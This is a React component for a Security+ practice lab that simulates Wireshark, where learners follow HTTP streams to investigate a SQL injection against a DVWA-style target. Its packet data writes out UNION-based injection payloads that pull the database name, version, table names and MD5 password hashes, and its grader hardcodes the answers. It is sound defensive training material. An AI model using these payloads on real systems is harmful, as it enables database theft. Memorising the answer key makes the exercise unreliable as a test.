
import React, { useState, useRef, useEffect } from 'react';

interface SqlInjectionWiresharkPBQProps {
  onComplete: (score: number) => void;
  onExit: () => void;
}

interface Packet {
  id: number;
  time: string;
  source: string;
  destination: string;
  protocol: string;
  length: number;
  info: string;
  streamId?: number; // Links to a specific TCP stream
}

interface StreamContent {
  [key: number]: {
    request: string;
    response: string;
  };
}

const TARGET_IP = '10.0.2.15';
const ATTACKER_IP = '10.0.2.4';

const PACKETS: Packet[] = [
  { id: 1, time: '0.000000', source: ATTACKER_IP, destination: TARGET_IP, protocol: 'TCP', length: 66, info: '49232 > 80 [SYN] Seq=0 Win=29200 Len=0 MSS=1460' },
  { id: 2, time: '0.000032', source: TARGET_IP, destination: ATTACKER_IP, protocol: 'TCP', length: 66, info: '80 > 49232 [SYN, ACK] Seq=0 Ack=1 Win=14480 Len=0 MSS=1460' },
  { id: 3, time: '0.000045', source: ATTACKER_IP, destination: TARGET_IP, protocol: 'TCP', length: 54, info: '49232 > 80 [ACK] Seq=1 Ack=1 Win=29200 Len=0' },
  // ... filler
  { id: 13, time: '3.421521', source: ATTACKER_IP, destination: TARGET_IP, protocol: 'HTTP', length: 456, info: 'GET /vulnerabilities/sqli/?id=1%3D1&Submit=Submit HTTP/1.1', streamId: 13 },
  { id: 14, time: '3.425121', source: TARGET_IP, destination: ATTACKER_IP, protocol: 'HTTP', length: 982, info: 'HTTP/1.1 200 OK (text/html)', streamId: 13 },
  
  { id: 19, time: '15.221511', source: ATTACKER_IP, destination: TARGET_IP, protocol: 'HTTP', length: 520, info: "GET /vulnerabilities/sqli/?id=1'+or+1%3D1+union+select+database()%2C+user()%23&Submit=Submit HTTP/1.1", streamId: 19 },
  { id: 20, time: '15.228112', source: TARGET_IP, destination: ATTACKER_IP, protocol: 'HTTP', length: 1024, info: 'HTTP/1.1 200 OK (text/html)', streamId: 19 },

  { id: 22, time: '28.115221', source: ATTACKER_IP, destination: TARGET_IP, protocol: 'HTTP', length: 512, info: "GET /vulnerabilities/sqli/?id=1'+or+1%3D1+union+select+null%2C+version()%23&Submit=Submit HTTP/1.1", streamId: 22 },
  { id: 23, time: '28.121332', source: TARGET_IP, destination: ATTACKER_IP, protocol: 'HTTP', length: 1010, info: 'HTTP/1.1 200 OK (text/html)', streamId: 22 },

  { id: 25, time: '45.551221', source: ATTACKER_IP, destination: TARGET_IP, protocol: 'HTTP', length: 600, info: "GET /vulnerabilities/sqli/?id=1'+or+1%3D1+union+select+null%2C+table_name+from+information_schema.tables%23&Submit=Submit HTTP/1.1", streamId: 25 },
  { id: 26, time: '45.567221', source: TARGET_IP, destination: ATTACKER_IP, protocol: 'HTTP', length: 2500, info: 'HTTP/1.1 200 OK (text/html)', streamId: 25 },

  { id: 28, time: '62.112521', source: ATTACKER_IP, destination: TARGET_IP, protocol: 'HTTP', length: 580, info: "GET /vulnerabilities/sqli/?id=1'+or+1%3D1+union+select+user%2C+password+from+users%23&Submit=Submit HTTP/1.1", streamId: 28 },
  { id: 29, time: '62.119221', source: TARGET_IP, destination: ATTACKER_IP, protocol: 'HTTP', length: 1100, info: 'HTTP/1.1 200 OK (text/html)', streamId: 28 },
];

const STREAMS: StreamContent = {
  13: {
    request: `GET /vulnerabilities/sqli/?id=1%3D1&Submit=Submit HTTP/1.1
Host: 10.0.2.15
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.0.2.15/vulnerabilities/sqli/
Cookie: security=low; PHPSESSID=bd851352932971239123
Connection: keep-alive`,
    response: `HTTP/1.1 200 OK
Date: Tue, 19 May 2023 10:10:15 GMT
Server: Apache/2.4.7 (Ubuntu)
X-Powered-By: PHP/5.5.9-1ubuntu4.14
Expires: Tue, 23 Jun 2009 12:00:00 GMT
Cache-Control: no-cache, must-revalidate
Pragma: no-cache
Content-Length: 4851
Content-Type: text/html;charset=utf-8

...
<pre>ID: 1=1<br />First name: admin<br />Surname: admin</pre>
<pre>ID: 1=1<br />First name: Gordon<br />Surname: Brown</pre>
...
`
  },
  19: {
    request: `GET /vulnerabilities/sqli/?id=1'+or+1%3D1+union+select+database()%2C+user()%23&Submit=Submit HTTP/1.1
Host: 10.0.2.15
...`,
    response: `HTTP/1.1 200 OK
...
<pre>ID: 1' or 1=1 union select database(), user()#<br />First name: dvwa<br />Surname: root@localhost</pre>
...
`
  },
  22: {
    request: `GET /vulnerabilities/sqli/?id=1'+or+1%3D1+union+select+null%2C+version()%23&Submit=Submit HTTP/1.1
Host: 10.0.2.15
...`,
    response: `HTTP/1.1 200 OK
...
<pre>ID: ...<br />First name: <br />Surname: 5.5.44-0ubuntu0.14.04.1</pre>
...
`
  },
  25: {
    request: `GET /vulnerabilities/sqli/?id=1'+or+1%3D1+union+select+null%2C+table_name+from+information_schema.tables%23&Submit=Submit HTTP/1.1
Host: 10.0.2.15
...`,
    response: `HTTP/1.1 200 OK
...
<pre>Surname: guestbook</pre>
<pre>Surname: users</pre>
...
`
  },
  28: {
    request: `GET /vulnerabilities/sqli/?id=1'+or+1%3D1+union+select+user%2C+password+from+users%23&Submit=Submit HTTP/1.1
Host: 10.0.2.15
...`,
    response: `HTTP/1.1 200 OK
...
<pre>First name: admin<br />Surname: 5f4dcc3b5aa765d61d8327deb882cf99</pre>
<pre>First name: gordonb<br />Surname: e99a18c428cb38d5f260853678922e03</pre>
<pre>First name: 1337<br />Surname: 8d3533d75ae2c3966d7e0d4fcc69216b</pre>
<pre>First name: pablo<br />Surname: 0d107d09f5bbe40cade3de5c71e9e9b7</pre>
<pre>First name: smithy<br />Surname: 5f4dcc3b5aa765d61d8327deb882cf99</pre>
...
`
  }
};

const SqlInjectionWiresharkPBQ: React.FC<SqlInjectionWiresharkPBQProps> = ({ onComplete, onExit }) => {
  const [selectedPacketId, setSelectedPacketId] = useState<number | null>(null);
  const [activeStreamId, setActiveStreamId] = useState<number | null>(null);
  const [filterText, setFilterText] = useState('');
  const [appliedFilter, setAppliedFilter] = useState('');
  const [contextMenu, setContextMenu] = useState<{x: number, y: number, packetId: number} | null>(null);
  
  // Quiz State
  const [answers, setAnswers] = useState({
    sourceIp: '',
    destIp: '',
    dbName: '',
    dbUser: '',
    dbVersion: '',
    hashUser: '',
    password: ''
  });
  const [feedback, setFeedback] = useState<string | null>(null);
  const [success, setSuccess] = useState(false);

  // --- Handlers ---

  const handlePacketRightClick = (e: React.MouseEvent, packetId: number) => {
    e.preventDefault();
    // Get position relative to the viewport to avoid issues with scroll
    setContextMenu({ x: e.clientX, y: e.clientY, packetId });
  };

  const closeContextMenu = () => setContextMenu(null);

  const handleFollowStream = () => {
    if (contextMenu) {
      const pkt = PACKETS.find(p => p.id === contextMenu.packetId);
      if (pkt && pkt.streamId) {
        setActiveStreamId(pkt.streamId);
      } else {
        alert("No TCP Stream available for this packet (non-HTTP or filler packet).");
      }
      closeContextMenu();
    }
  };

  const handleFilterSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    setAppliedFilter(filterText);
  };

  const handleCheckAnswers = () => {
    const errors = [];
    
    if (answers.sourceIp !== ATTACKER_IP && answers.sourceIp !== '10.0.2.4') errors.push("Incorrect Source IP (Attacker).");
    if (answers.destIp !== TARGET_IP && answers.destIp !== '10.0.2.15') errors.push("Incorrect Destination IP (Target).");
    if (answers.dbName.toLowerCase() !== 'dvwa') errors.push("Incorrect Database Name.");
    if (answers.dbUser.toLowerCase() !== 'root@localhost' && answers.dbUser.toLowerCase() !== 'root') errors.push("Incorrect Database User.");
    if (!answers.dbVersion.includes('5.5.44')) errors.push("Incorrect Database Version.");
    if (answers.hashUser !== '1337') errors.push("Incorrect user associated with the hash.");
    if (answers.password !== '123456') errors.push("Incorrect plaintext password (did you crack the hash?).");

    if (errors.length === 0) {
        setSuccess(true);
        setFeedback("Investigation Complete! You successfully analyzed the PCAP, identified the SQL Injection vector, extracted database metadata, and cracked the password hash.");
        onComplete(100);
    } else {
        setSuccess(false);
        setFeedback("Incorrect Answers:\n" + errors.map(e => "• " + e).join("\n"));
    }
  };

  // Filter Logic
  const filteredPackets = PACKETS.filter(p => {
    if (!appliedFilter) return true;
    const f = appliedFilter.toLowerCase();
    if (f === 'http') return p.protocol === 'HTTP';
    if (f.includes('ip.addr')) return p.source.includes(f.split('==')[1]?.trim()) || p.destination.includes(f.split('==')[1]?.trim());
    return p.info.toLowerCase().includes(f) || p.source.includes(f) || p.destination.includes(f);
  });

  return (
    <div className="fixed inset-0 bg-gray-100 z-50 flex flex-col animate-fadeIn overflow-y-auto font-sans" onClick={closeContextMenu}>
      {/* Header */}
      <div className="bg-white shadow-md p-4 sticky top-0 z-10 flex justify-between items-center border-b border-gray-200">
        <div className="flex items-center gap-3">
          <div className="bg-blue-600 text-white p-2 rounded-lg shadow-sm">
            <i className="fas fa-network-wired"></i>
          </div>
          <div>
            <h2 className="text-xl font-bold text-gray-900">PCAP Analysis: SQL Injection</h2>
            <p className="text-xs text-gray-500">Security+ PBQ Simulation</p>
          </div>
        </div>
        <button onClick={onExit} className="text-gray-400 hover:text-gray-700 p-2 rounded-full hover:bg-gray-100 transition-all">
          <i className="fas fa-times text-2xl"></i>
        </button>
      </div>

      <div className="flex-grow p-4 md:p-8 max-w-7xl mx-auto w-full flex flex-col lg:flex-row gap-6 h-[calc(100vh-100px)]">
        
        {/* Left: Questions Panel */}
        <div className="lg:w-1/4 bg-white rounded-xl shadow-sm border border-gray-200 flex flex-col overflow-hidden">
            <div className="p-4 bg-gray-50 border-b border-gray-200">
                <h3 className="font-bold text-gray-800"><i className="fas fa-clipboard-list text-blue-600 mr-2"></i> Lab Questions</h3>
            </div>
            <div className="p-4 flex-grow overflow-y-auto space-y-6 text-sm">
                
                <div className="space-y-2">
                    <label className="font-bold text-gray-700 block">1. Attacker IP Address</label>
                    <input 
                        type="text" 
                        className="w-full p-2 border rounded bg-gray-50 focus:bg-white focus:ring-2 focus:ring-blue-500 outline-none text-gray-900"
                        value={answers.sourceIp}
                        onChange={(e) => setAnswers({...answers, sourceIp: e.target.value})}
                    />
                </div>

                <div className="space-y-2">
                    <label className="font-bold text-gray-700 block">2. Target IP Address</label>
                    <input 
                        type="text" 
                        className="w-full p-2 border rounded bg-gray-50 focus:bg-white focus:ring-2 focus:ring-blue-500 outline-none text-gray-900"
                        value={answers.destIp}
                        onChange={(e) => setAnswers({...answers, destIp: e.target.value})}
                    />
                </div>

                <div className="space-y-2">
                    <label className="font-bold text-gray-700 block">3. Database Name</label>
                    <input 
                        type="text" 
                        className="w-full p-2 border rounded bg-gray-50 focus:bg-white focus:ring-2 focus:ring-blue-500 outline-none text-gray-900"
                        value={answers.dbName}
                        onChange={(e) => setAnswers({...answers, dbName: e.target.value})}
                    />
                </div>

                <div className="space-y-2">
                    <label className="font-bold text-gray-700 block">4. Database User</label>
                    <input 
                        type="text" 
                        className="w-full p-2 border rounded bg-gray-50 focus:bg-white focus:ring-2 focus:ring-blue-500 outline-none text-gray-900"
                        value={answers.dbUser}
                        onChange={(e) => setAnswers({...answers, dbUser: e.target.value})}
                    />
                </div>

                <div className="space-y-2">
                    <label className="font-bold text-gray-700 block">5. DB Version</label>
                    <input 
                        type="text" 
                        className="w-full p-2 border rounded bg-gray-50 focus:bg-white focus:ring-2 focus:ring-blue-500 outline-none text-gray-900"
                        value={answers.dbVersion}
                        onChange={(e) => setAnswers({...answers, dbVersion: e.target.value})}
                        placeholder="e.g. 5.0.1"
                    />
                </div>

                <div className="space-y-2 border-t pt-4">
                    <div className="text-xs text-gray-500 mb-2">From Packet 28 (User Table):</div>
                    <label className="font-bold text-gray-700 block">6. User with hash ending in ...216b</label>
                    <input 
                        type="text" 
                        className="w-full p-2 border rounded bg-gray-50 focus:bg-white focus:ring-2 focus:ring-blue-500 outline-none text-gray-900"
                        value={answers.hashUser}
                        onChange={(e) => setAnswers({...answers, hashUser: e.target.value})}
                    />
                </div>

                <div className="space-y-2">
                    <label className="font-bold text-gray-700 block">7. Cracked Password (Plaintext)</label>
                    <input 
                        type="text" 
                        className="w-full p-2 border rounded bg-gray-50 focus:bg-white focus:ring-2 focus:ring-blue-500 outline-none text-gray-900"
                        value={answers.password}
                        onChange={(e) => setAnswers({...answers, password: e.target.value})}
                        placeholder="MD5 Hash"
                    />
                </div>

                <button 
                    onClick={handleCheckAnswers}
                    className="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-2 rounded shadow-md transition-colors"
                >
                    Submit Answers
                </button>
            </div>
        </div>

        {/* Right: Simulated Wireshark */}
        <div className="lg:w-3/4 flex flex-col gap-0 bg-white rounded-xl shadow-xl border border-gray-400 overflow-hidden relative">
            
            {/* Wireshark Toolbar */}
            <div className="bg-gray-100 border-b border-gray-300 p-2 flex items-center gap-2">
                <span className="text-sm font-bold text-gray-600">Filter:</span>
                <form onSubmit={handleFilterSubmit} className="flex-grow">
                    <input 
                        type="text" 
                        className="w-full border border-gray-300 rounded px-2 py-1 text-sm bg-white text-gray-900"
                        placeholder="Apply a display filter ... <Ctrl-/>"
                        value={filterText}
                        onChange={(e) => setFilterText(e.target.value)}
                    />
                </form>
                <button onClick={() => setAppliedFilter(filterText)} className="bg-blue-600 text-white px-3 py-1 rounded text-xs font-bold hover:bg-blue-700">Apply</button>
                <button onClick={() => { setFilterText(''); setAppliedFilter(''); }} className="bg-gray-300 text-gray-700 px-3 py-1 rounded text-xs font-bold hover:bg-gray-400">Clear</button>
            </div>

            {/* Packet List */}
            <div className="flex-grow overflow-auto bg-white" style={{ flexBasis: '50%' }}>
                <table className="w-full text-left text-xs font-mono border-collapse">
                    <thead className="bg-gray-200 sticky top-0 shadow-sm text-gray-700">
                        <tr>
                            <th className="border-r border-gray-300 px-2 py-1 w-12">No.</th>
                            <th className="border-r border-gray-300 px-2 py-1 w-24">Time</th>
                            <th className="border-r border-gray-300 px-2 py-1 w-32">Source</th>
                            <th className="border-r border-gray-300 px-2 py-1 w-32">Destination</th>
                            <th className="border-r border-gray-300 px-2 py-1 w-16">Protocol</th>
                            <th className="border-r border-gray-300 px-2 py-1 w-16">Length</th>
                            <th className="px-2 py-1">Info</th>
                        </tr>
                    </thead>
                    <tbody>
                        {filteredPackets.map(pkt => (
                            <tr 
                                key={pkt.id} 
                                onClick={() => setSelectedPacketId(pkt.id)}
                                onContextMenu={(e) => handlePacketRightClick(e, pkt.id)}
                                className={`cursor-pointer ${selectedPacketId === pkt.id ? 'bg-blue-600 text-white' : 'hover:bg-blue-50 odd:bg-white even:bg-gray-50 text-gray-800'}`}
                            >
                                <td className="border-r border-gray-300 px-2 py-0.5">{pkt.id}</td>
                                <td className="border-r border-gray-300 px-2 py-0.5">{pkt.time}</td>
                                <td className="border-r border-gray-300 px-2 py-0.5">{pkt.source}</td>
                                <td className="border-r border-gray-300 px-2 py-0.5">{pkt.destination}</td>
                                <td className={`border-r border-gray-300 px-2 py-0.5 ${selectedPacketId !== pkt.id ? (pkt.protocol === 'HTTP' ? 'bg-green-100 text-green-900' : 'bg-gray-100') : ''}`}>{pkt.protocol}</td>
                                <td className="border-r border-gray-300 px-2 py-0.5">{pkt.length}</td>
                                <td className="px-2 py-0.5 whitespace-nowrap">{pkt.info}</td>
                            </tr>
                        ))}
                    </tbody>
                </table>
            </div>

            {/* Packet Details (Static/Simplified) */}
            <div className="h-1/3 border-t border-gray-400 overflow-auto bg-white p-2 text-xs font-mono">
                {selectedPacketId ? (
                    <div className="space-y-1">
                        <div className="font-bold text-gray-700">Frame {selectedPacketId}: {PACKETS.find(p => p.id === selectedPacketId)?.length} bytes on wire</div>
                        <div className="text-gray-600 pl-4">Ethernet II, Src: 08:00:27:xx:xx:xx, Dst: 08:00:27:yy:yy:yy</div>
                        <div className="text-gray-600 pl-4">Internet Protocol Version 4, Src: {PACKETS.find(p => p.id === selectedPacketId)?.source}, Dst: {PACKETS.find(p => p.id === selectedPacketId)?.destination}</div>
                        <div className="text-gray-600 pl-4">Transmission Control Protocol, Src Port: 49232, Dst Port: 80</div>
                        {PACKETS.find(p => p.id === selectedPacketId)?.protocol === 'HTTP' && (
                            <div className="text-blue-800 pl-4 font-bold">Hypertext Transfer Protocol</div>
                        )}
                    </div>
                ) : (
                    <div className="text-gray-400 italic">Select a packet to view details.</div>
                )}
            </div>

            {/* Context Menu */}
            {contextMenu && (
                <div 
                    className="fixed bg-white border border-gray-300 shadow-xl rounded py-1 z-[100] text-sm w-48"
                    style={{ top: contextMenu.y, left: contextMenu.x }}
                >
                    <div className="px-4 py-1 hover:bg-blue-600 hover:text-white cursor-pointer text-gray-700">Mark Packet</div>
                    <div className="px-4 py-1 hover:bg-blue-600 hover:text-white cursor-pointer text-gray-700">Copy</div>
                    <div className="border-t border-gray-200 my-1"></div>
                    <div className="px-4 py-1 hover:bg-blue-600 hover:text-white cursor-pointer font-bold text-gray-800" onClick={handleFollowStream}>Follow HTTP Stream</div>
                    <div className="px-4 py-1 hover:bg-blue-600 hover:text-white cursor-pointer text-gray-700">Follow TCP Stream</div>
                </div>
            )}

            {/* Stream Window Modal */}
            {activeStreamId !== null && (
                <div className="absolute inset-0 bg-black/50 z-50 flex items-center justify-center p-8">
                    <div className="bg-white w-full h-full max-w-4xl max-h-[800px] rounded shadow-2xl flex flex-col border border-gray-500">
                        <div className="bg-gray-100 p-2 border-b border-gray-300 flex justify-between items-center">
                            <span className="font-bold text-sm text-gray-800">Follow HTTP Stream (Stream #{activeStreamId})</span>
                            <button onClick={() => setActiveStreamId(null)} className="text-gray-500 hover:text-red-500"><i className="fas fa-times"></i></button>
                        </div>
                        <div className="flex-grow bg-white p-4 overflow-auto font-mono text-xs whitespace-pre-wrap">
                            <span className="text-red-600 font-bold block mb-4">{STREAMS[activeStreamId]?.request}</span>
                            <span className="text-blue-600 font-bold block">{STREAMS[activeStreamId]?.response}</span>
                        </div>
                        <div className="p-2 bg-gray-100 border-t border-gray-300 flex justify-between">
                            <div className="text-xs text-gray-500">Entire conversation ({STREAMS[activeStreamId]?.request.length + STREAMS[activeStreamId]?.response.length} bytes)</div>
                            <div className="flex gap-2">
                                <button className="px-3 py-1 bg-white border rounded text-xs hover:bg-gray-50 text-gray-700">Find</button>
                                <button className="px-3 py-1 bg-white border rounded text-xs hover:bg-gray-50 text-gray-700">Print</button>
                                <button onClick={() => setActiveStreamId(null)} className="px-3 py-1 bg-white border rounded text-xs hover:bg-gray-50 text-red-600">Close</button>
                            </div>
                        </div>
                    </div>
                </div>
            )}

        </div>

      </div>

      {/* Feedback Modal */}
      {feedback && (
        <div className="fixed inset-0 z-[60] flex items-center justify-center p-4 bg-gray-900/50 backdrop-blur-sm animate-fadeIn">
            <div className="bg-white rounded-2xl shadow-2xl max-w-lg w-full overflow-hidden">
                <div className={`p-6 text-center border-b ${success ? 'bg-green-50 border-green-100' : 'bg-red-50 border-red-100'}`}>
                    <div className={`mx-auto w-16 h-16 rounded-full flex items-center justify-center mb-4 ${success ? 'bg-green-100 text-green-600' : 'bg-red-100 text-red-600'}`}>
                        <i className={`fas ${success ? 'fa-check' : 'fa-exclamation-triangle'} text-3xl`}></i>
                    </div>
                    <h3 className={`text-2xl font-bold ${success ? 'text-green-800' : 'text-red-800'}`}>
                        {success ? 'Analysis Successful' : 'Incorrect Findings'}
                    </h3>
                </div>
                
                <div className="p-8">
                    <div className="whitespace-pre-line text-gray-700 text-sm leading-relaxed">
                        {feedback}
                    </div>
                </div>

                <div className="p-6 bg-gray-50 flex justify-center gap-4">
                    {success ? (
                        <button onClick={onExit} className="w-full bg-green-600 hover:bg-green-700 text-white font-bold py-3 px-6 rounded-xl transition-colors shadow-md">
                            Return to Dashboard
                        </button>
                    ) : (
                        <button onClick={() => setFeedback(null)} className="w-full bg-gray-800 hover:bg-gray-900 text-white font-bold py-3 px-6 rounded-xl transition-colors shadow-md">
                            Review Evidence
                        </button>
                    )}
                </div>
            </div>
        </div>
      )}
    </div>
  );
};

export default SqlInjectionWiresharkPBQ;
